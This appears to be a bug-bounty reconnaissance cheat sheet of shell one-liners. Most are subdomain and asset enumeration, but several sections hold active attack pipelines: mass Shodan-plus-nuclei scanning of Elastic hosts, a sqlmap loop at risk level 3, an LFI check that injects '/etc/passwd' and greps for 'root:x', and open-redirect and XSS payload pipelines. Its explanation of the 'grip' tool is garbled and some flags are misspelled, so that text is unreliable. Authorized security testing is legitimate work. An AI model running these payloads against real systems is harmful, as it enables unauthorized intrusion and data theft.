# Recon One-Liner

### Dump In-scope Assets from BBPs using repo from [@arkadiyt](https://github.com/arkadiyt/bounty-targets-data)

**HackerOne Programs**

```bash
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/hackerone_data.json | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
```

**BugCrowd Programs**

```bash
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

**Intigriti Programs**

```bash
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'
```

**YesWeHack Programs**

```bash
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

**HackenProof Programs**

```bash
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'
```

**Federacy Programs**

```bash
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

Dump list of all BBP Domains that are in scope

```
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/domains.txt
```

### Martian Grip

from [@notnci](https://gist.github.com/notnci/e65f9d1a167909f1a3f352aded53998b) with beginner explanation

`shodan download testing 'cloud.region:"us-east-1" 200 product:"Elastic" port:8001'; shodan parse --fields ip_str,port testing.json.gz | tee testing_parsed.out | awk '{print$1":"$2}' | httpx -silent -o testing_httpx.out | nuclei -as -silent -o testing_nuclei.out; cat testing_nuclei.out | awk -F " " '{print $6}' | grip | uniq -u | tee testing_vuln_ips.out | nrich - | tee testing_nrich.out`

```
shodan download testing 'cloud.region:"us-east-1" 200 product:"Elastic" port:8001'; shodan parse --fields ip_str,port testing.json.gz | tee testing_parsed.out | awk '{print$1":"$2}' | httpx -silent -o testing_httpx.out | nuclei -as -silent -o testing_nuclei.out; cat testing_nuclei.out | awk -F " " '{print $6}' | grip | uniq -u | tee testing_vuln_ips.out | nrich - | tee testing_nrich.out
```

* The `shodan download` command is attempting to search for devices in the US East (N. Virginia) region that have a product named "Elastic" and are listening on port 8001. The `parse` command is used to extract certain fields (in this case, `ip_str` and `port`) from the results of the search, which are stored in the file `testing.json.gz`.
* `httpx` is a tool that can be used to perform HTTP requests and analyze the response. In this case, the command is using the `-silent` flag to suppress output and the `-o` flag to write the response to a file called `testing_httpx.out`. The input for this command appears to be the list of IP addresses and ports extracted from the Shodan search results.
* ``[`nuclei`](https://github.com/projectdiscovery/nuclei) is a tool for detecting vulnerabilities and misconfigurations in web applications. The `-as` flag stands for "active scan", which means that the tool will perform various types of requests to the target web application in order to identify potential vulnerabilities. The `-silent` flag suppresses output, and the `-o` flag specifies an output file for the results. The input for this command is the list of IP addresses and ports extracted from the Shodan search results.
* `awk` is a tool for processing text files. The command appears to be extracting the sixth field (`$6`) from the output of the `nuclei` command, which is piped (`|`) to the `grip` command.
* `grip` is a command line tool for rendering local readme files before sending them to GitHub. In this case, it is used to render the output of the `awk` command, which is then passed to `uniq` with the `-u` flag to remove duplicate lines. The resulting list of unique lines is written to the file `testing_vuln_ips.out`.
* [`nrich`](https://gitlab.com/shodan-public/nrich) is a tool for performing OSINT (Open Source Intelligence) on IP addresses. The input for this command appears to be the list of IP addresses and ports extracted from the Shodan search results, and the `-` flag tells the tool to read the input from standard input (stdin). The results are written to the file `testing_nrich.out`.

### Find SQLi at scale

`# collect target urls`\
``\
`subfinder -d site.com -silent - all | httpx -silent -threads 100 | katana -d 4 -jc -ef css,png,svg,ico,woff,gif | tee -a urls`\
``\
`# filter potential SQLi Url`\
`cat urls | gf sqli | tee -a sqli`\
``\
`# run test`\
`while read line; do sqlmap -u $line --parse-errors --curent-db --invalid-logical --invalid-bignum --invalid-string --risk 3; done < sqli`

#### Local File Inclusion

```bash
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

#### Open-redirect

```bash
export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

```bash
cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
```

#### XSS

```bash
gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
```

#### Find JavaScript Files

```bash
assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
```

#### Extract Endpoints from JavaScript

```bash
cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```

#### Get CIDR & Org Information from Target Lists

```bash
for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done
```

## Finding Submomains

#### Get Subdomains from RapidDNS.io

```bash
curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u
```

#### Get Subdomains from BufferOver.run

```bash
curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u
```

```bash
export domain="HOST"; curl "https://tls.bufferover.run/dns?q=$domain" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$domain"
```

#### Get Subdomains from Riddler.io

```bash
curl -s "https://riddler.io/search/exportcsv?q=pld:HOST" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```

#### Get Subdomains from VirusTotal

```bash
curl -s "https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

#### Get Subdomain with cyberxplore

```
curl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" 
```

#### Get Subdomains from CertSpotter

```bash
curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```

#### Get Subdomains from Archive

```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.HOST/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```

#### Get Subdomains from JLDC

```bash
curl -s "https://jldc.me/anubis/subdomains/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

#### Get Subdomains from securitytrails

```bash
curl -s "https://securitytrails.com/list/apex_domain/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u
```

#### Bruteforcing Subdomain using DNS Over

```
while read sub; do echo "https://dns.google.com/resolve?name=$sub.HOST&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u ; done < FILE.txt
```

#### Get Subdomains With sonar.omnisint.io

```
curl --silent https://sonar.omnisint.io/subdomains/HOST | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u 
```

#### Get Subdomains With synapsint.com

```
curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2FHOST" | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u 
```

#### Get Subdomains from crt.sh

```bash
curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

#### Sort & Tested Domains from Recon.dev

```bash
curl "https://recon.dev/api/search?key=apikey&domain=HOST" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u | httpx -silent
```

#### Subdomain Bruteforcer with FFUF

```bash
ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
```

#### Find Allocated IP Ranges for ASN from IP Address

```bash
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
```

#### Extract IPs from a File

```bash
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
```

